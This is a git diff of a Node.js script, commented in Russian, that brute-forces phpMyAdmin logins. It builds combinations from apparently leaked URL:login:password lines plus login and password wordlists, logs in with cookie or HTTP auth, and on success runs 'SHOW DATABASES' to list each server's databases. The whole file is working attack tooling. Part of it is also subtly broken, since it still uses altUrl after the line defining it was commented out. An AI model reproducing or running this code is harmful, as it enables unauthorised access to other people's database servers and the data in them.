@@ -4,13 +4,14 @@ const loggedAxiosRequest = require("./services/loggedAxiosRequest");
 const axios = require("axios");
 require('dotenv').config();
 
-const phpMyAdminUrl = process.env.PHP_MY_ADMIN_URL;
-
-// === Функция для чтения файла ===
 function readFileIfExists(filename) {
     if (fs.existsSync(filename)) {
-        const content = fs.readFileSync(filename, 'utf-8').split('\n').map(line => line.trim()).filter(line => line);
-        return new Set(content); // Убираем дубликаты, преобразуя в Set
+        return new Set(
+            fs.readFileSync(filename, 'utf-8')
+                .split('\n')
+                .map(line => line.trim())
+                .filter(line => line) // Убираем пустые строки
+        );
     }
     return new Set();
 }
@@ -20,40 +21,86 @@ const mainFile = process.env.MAIN_FILE || "./files/input.txt"; // Основно
 const loginsFile = "./files/logins.txt";
 const passwordsFile = "./files/passwords.txt";
 
-// Читаем основной файл и разбираем URL, логины и пароли
+// Читаем файлы
 const rawLines = readFileIfExists(mainFile);
 const logins = readFileIfExists(loginsFile);
 const passwords = readFileIfExists(passwordsFile);
 
-let targets = [];
+let targets = new Set(); // Используем Set, чтобы избежать дубликатов
 
+// Функция для разбора строки (правильно отделяет URL, логин и пароль)
+function parseLine(line) {
+    const match = line.match(/^(https?:\/\/[^\s:]+(:\d+)?(?:\/[^\s:]*)?):([^:]+):(.+)$/);
+    if (match) {
+        const [, url, , login, password] = match;
+        return { url, login, password };
+    }
+    return null;
+}
+
+// Обрабатываем строки из input.txt
 for (const line of rawLines) {
-    const [url, login, password] = line.split(":");
-    if (url && login && password) {
-        targets.push({ url, login, password });
-        logins.add(login); // Добавляем в список логинов
-        passwords.add(password); // Добавляем в список паролей
+    const parsed = parseLine(line);
+    if (parsed) {
+        targets.add(parsed);
+
+        /*// Добавляем зеркальный URL (http <-> https)
+        const altUrl = parsed.url.startsWith("http://")
+            ? parsed.url.replace("http://", "https://")
+            : parsed.url.replace("https://", "http://");
+
+        targets.add({ url: altUrl, login: parsed.login, password: parsed.password });*/
     }
 }
 
 // === Генерация всех комбинаций ===
 const loginList = [...logins];
 const passwordList = [...passwords];
-const protocols = ["http", "https"];
 
-let combinations = [];
+let combinations = new Set(); // Избегаем дубликатов
 
-targets.forEach(({ url }) => {
-    protocols.forEach(protocol => {
-        loginList.forEach(login => {
-            passwordList.forEach(password => {
-                combinations.push({ url: `${protocol}://${url}`, login, password });
-            });
-        });
+for (const { url, login, password } of targets) {
+    // Оригинальная комбинация
+    combinations.add({ url, login, password });
+
+    // Генерация комбинаций с logins.txt и passwords.txt
+    passwordList.forEach(extraPassword => {
+        combinations.add({ url, login, password: extraPassword }); // Меняем только пароль
     });
-});
 
-console.log(`✅ Сформировано ${combinations.length} комбинаций для тестирования.`);
+    loginList.forEach(extraLogin => {
+        combinations.add({ url, login: extraLogin, password }); // Меняем только логин
+    });
+
+    /*// Зеркальный URL (http <-> https)
+    const altUrl = url.startsWith("http://")
+        ? url.replace("http://", "https://")
+        : url.replace("https://", "http://");
+
+    combinations.add({ url: altUrl, login, password });*/
+
+    passwordList.forEach(extraPassword => {
+        combinations.add({ url: altUrl, login, password: extraPassword }); // Меняем только пароль
+    });
+
+    loginList.forEach(extraLogin => {
+        combinations.add({ url: altUrl, login: extraLogin, password }); // Меняем только логин
+    });
+}
+// Используем Map для удаления дубликатов
+const uniqueMap = new Map();
+for (const obj of combinations) {
+    const key = JSON.stringify(obj);
+    if (!uniqueMap.has(key)) {
+        uniqueMap.set(key, obj);
+    }
+}
+
+// Преобразуем обратно в Set
+const uniqueCombinations = new Set(uniqueMap.values());
+
+// Выводим количество сформированных комбинаций
+console.log(`✅ Сформировано ${uniqueCombinations.size} комбинаций для тестирования.`);
 
 class PmaClient {
 
@@ -61,43 +108,83 @@ class PmaClient {
      cookie;
      login;
      password;
-     encodedAuth; // для http авторизации
+     token;
+     pmaCookieVer;
+     pma_collation_connection;
+     pmaUser_1;
+     pmaAuth_1;
+     encodedAuth; // для авторизации при ['auth_type'] = 'http'
      session; // для cookie авторизации
-     user; // для cookie авторизации
-     auth; // для cookie авторизации
 
     constructor(phpMyAdminUrl, login, password) {
-        this.phpMyAdminUrl = phpMyAdminUrl;
+        this.phpMyAdminUrl = phpMyAdminUrl.endsWith('/') ? phpMyAdminUrl : phpMyAdminUrl + '/';
         this.login = login;
         this.password = password;
     }
+
+    updateCookies(newCookies) {
+        if (!newCookies) return;
+
+        const cookieMap = {
+            cookie: ["phpMyAdmin=", "phpMyAdmin_https="],
+            pmaCookieVer: ["pmaCookieVer="],
+            pma_collation_connection: ["pma_collation_connection="],
+            pmaUser_1: ["pmaUser-1=", "pmaUser-1_https="],
+            pmaAuth_1: ["pmaAuth-1=", "pmaAuth-1_https="]
+        };
+
+        Object.keys(cookieMap).forEach(key => {
+            const foundCookie = newCookies
+                .filter(cookie => cookieMap[key].some(prefix => cookie.startsWith(prefix)))
+                .pop();
+
+            if (foundCookie) {
+                const cookieValue = foundCookie.split(";")[0];
+
+                if (cookieValue.includes("=deleted")) {
+                    //console.log(`Skipping deleted cookie for key "${key}": ${cookieValue}`);
+                    return;
+                }
+
+                this[key] = cookieValue;
+                //console.log(`Assigned cookie for key "${key}": ${this[key]}`);
+            }
+        });
+
+        this.session = this.cookie.replace(/phpMyAdmin(_https)?=/, "");
+    }
+
+
+    updateToken(html) {
+        const $ = cheerio.load(html);
+        const token = $('input[name="token"]').val();
+        if (!token) throw new Error("Не удалось извлечь токен.");
+        this.token = token;
+        //console.log(`Assigned token: ${this.token}`);
+    }
+
 
     // === Функция для авторизации при ['auth_type'] = 'cookie' ===
     loginAndGetCookies = async () => {
         try {
             // Запрос к странице входа
-            const response = await loggedAxiosRequest.get(this.phpMyAdminUrl, {
-                headers: { "User-Agent": "Mozilla/5.0" },
+            const response = await axios.get(this.phpMyAdminUrl, {
+                headers: {"User-Agent": "Mozilla/5.0"},
             });
-
             // Получаем куки из ответа
             const rawCookies = response.headers["set-cookie"];
+            //console.log('rawCookies' + rawCookies + '\n');
             if (rawCookies) {
-                this.cookie = rawCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
-                this.session = this.cookie.replace("phpMyAdmin=", "");
+                this.updateCookies(rawCookies);
             }
 
             // Извлекаем токен из HTML
-            const $ = cheerio.load(response.data);
-            const token = $('input[name="token"]').val();
-            if (!token) throw new Error("Не удалось извлечь токен.");
-
-            console.log(`Токен получен: ${token}`);
+            this.updateToken(response.data);
 
             // Отправляем POST-запрос на авторизацию
-            const loginResponse = await loggedAxiosRequest.post(this.phpMyAdminUrl, new URLSearchParams({
+            const loginResponse = await axios.post(this.phpMyAdminUrl, new URLSearchParams({
                 route: "/",
-                token: token,
+                token: this.token,
                 set_session: this.session,
                 pma_username: this.login,
                 pma_password: this.password,
@@ -108,24 +195,45 @@ class PmaClient {
                     "User-Agent": "Mozilla/5.0",
                     Cookie: this.cookie,
                 },
+                maxRedirects: 0,
+                validateStatus: (status) => true,
             });
 
             // Обновляем куки
             const newCookies = loginResponse.headers["set-cookie"];
             if (newCookies) {
-                this.cookie = newCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
-               // this.user = newCookies.filter(cookie => cookie.startsWith("pmaUser-1=")).pop().split(';')[0];
-               // this.auth = newCookies.filter(cookie => cookie.startsWith("pmaAuth-1=")).pop().split(';')[0];
+                this.updateCookies(newCookies)
             }
 
-            // Извлекаем токен из HTML ??? refresh?
+            // ищем токен в Headers.Location
+            const location = loginResponse.headers?.location;
+            //console.log('LOCATION: ' + location)
+            if (location.includes('token=')) {
+                const tokenMatch = location.match(/[?&]token=([^&]+)/);
+                this.token = tokenMatch ? tokenMatch[1] : undefined;
+                //console.log(`Assigned token from LOCATION: ${this.token}`);
+            } else {
+            //если нет в Location - делаем Get запрос
+                const response1 = await axios.get(this.phpMyAdminUrl, {
+                    headers: {
+                        "User-Agent": "Mozilla/5.0",
+                        Cookie: [this.cookie, this.pmaUser_1, this.pmaAuth_1, 'pma_lang=ru']
+                            .filter(Boolean)
+                            .join("; ")
+                    }
+                })
+                this.updateToken(response1.data);
+                const cookies = response1.headers['set-cookie']
+                if (cookies) {
+                    this.updateCookies(cookies)
+                }
+            }
+            console.log(`✅ Авторизация успешна (${this.phpMyAdminUrl}:${this.login}:${this.password}).`);
+            return true;
 
-            console.log(`✅ Авторизация успешна (${this.login}:${this.password}).`);
-            return token;
         } catch (error) {
             console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}`);
-            return null;
-            //throw error;
+            return false;
         }
     };
     // === Функция для авторизации при ['auth_type'] = 'http' ===
@@ -140,12 +248,12 @@ class PmaClient {
             // Получаем куки из ответа
             const rawCookies = response.headers["set-cookie"];
             if (rawCookies) {
-                this.cookie = rawCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
+                this.updateCookies(rawCookies)
             }
 
             // Отправляем GET-запрос на авторизацию
             this.encodedAuth = 'Basic ' + Buffer.from(`${this.login}:${this.password}`).toString('base64');
-            const loginResponse = await loggedAxiosRequest.get(this.phpMyAdminUrl, {
+            const loginResponse = await axios.get(this.phpMyAdminUrl, {
                 headers: {
                     "User-Agent": "Mozilla/5.0",
                     Cookie: this.cookie,
@@ -154,65 +262,61 @@ class PmaClient {
             });
 
             // Извлекаем токен из HTML ответа
-            const $ = cheerio.load(loginResponse.data);
-            const token = $('input[name="token"]').val();
-            if (!token) throw new Error("Не удалось извлечь токен.");
-            console.log(`Токен получен: ${token}`);
+            this.updateToken(loginResponse.data);
 
             console.log(`✅ Авторизация успешна (${this.login}:${this.password}).`);
-            return token;
+            return true;
         } catch (error) {
             console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}`);
-            return null;
+            return false;
             //throw error;
         }
     };
 
     // === Функция для выполнения SQL-запросов ===
-    executeSQLQuery = async (phpMyAdminUrl, token, query) => {
-        const queryUrl = `${phpMyAdminUrl}${process.env.ROUTE_QUERY || "/index.php?route=/import"}`;
-
+    executeSQLQuery = async (query) => {
+        const phpMyAdminUrl = this.phpMyAdminUrl.trim().replace(/index\.php\/?$/, '');
+        const queryUrl = `${phpMyAdminUrl}import.php`;
         try {
-            const response = await loggedAxiosRequest.post(queryUrl, new URLSearchParams({
-                route: "/import",
-                token,
+            const response = await axios.post(queryUrl, new URLSearchParams({
+                token: this.token,
                 sql_query: query,
-                is_js_confirmed: "1",
+                is_js_confirmed: "0",
                 ajax_request: "true",
                 _nocache: Date.now(),
+                goto: "server_sql.php",
+                ajax_page_request: true
             }).toString(), {
                 headers: {
                     "Content-Type": "application/x-www-form-urlencoded",
-                    "User-Agent": "Mozilla/5.0",
-                    Cookie: this.cookie,
-                    Authorization: this.encodedAuth
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
+                        .filter(Boolean)
+                        .join("; "),
+                    Authorization: this.encodedAuth,// for http type auth
+                    "X-Requested-With": "XMLHttpRequest"
                 },
             });
-
+            if (!response.data.success) throw new Error ('Запрос не выполнен')
             // Обрабатываем HTML-ответ
             const $ = cheerio.load(response.data.message);
             const databases = $('table.table_results tbody tr').map((_, row) => {
                 return $(row).find('td').first().text().trim();
             }).get();
-            console.log(`Найденные базы данных (${databases.length}): ${databases.join(", ")}`);
+            console.log(`Найденные базы данных (${databases.length}): \x1b[32m${databases.join(", ")}\x1b[0m`);
+
         } catch (error) {
             console.log("❌ Ошибка выполнения SQL-запроса:", error.message);
         }
     }
 }
 
-// === Основной цикл перебора всех комбинаций ===
+// === Цикл перебора всех комбинаций ===
 (async () => {
-    for (const { url, login, password } of combinations) {
-        console.log(`Проверяем: ${url} с логином ${login}...`);
+    for (const { url, login, password } of uniqueCombinations) {
         const client = new PmaClient(url, login, password);
-        const token = await client.loginAndGetCookiesHttp();
-
-        if (token) {
-            console.log(`Запускаем SQL-запрос...`);
-            await client.executeSQLQuery(url, token, "SHOW DATABASES;");
+        if (await client.loginAndGetCookies()) {
+            await client.executeSQLQuery("SHOW DATABASES;");
         }
     }
-
-    console.log("✅ Тестирование завершено!");
 })();
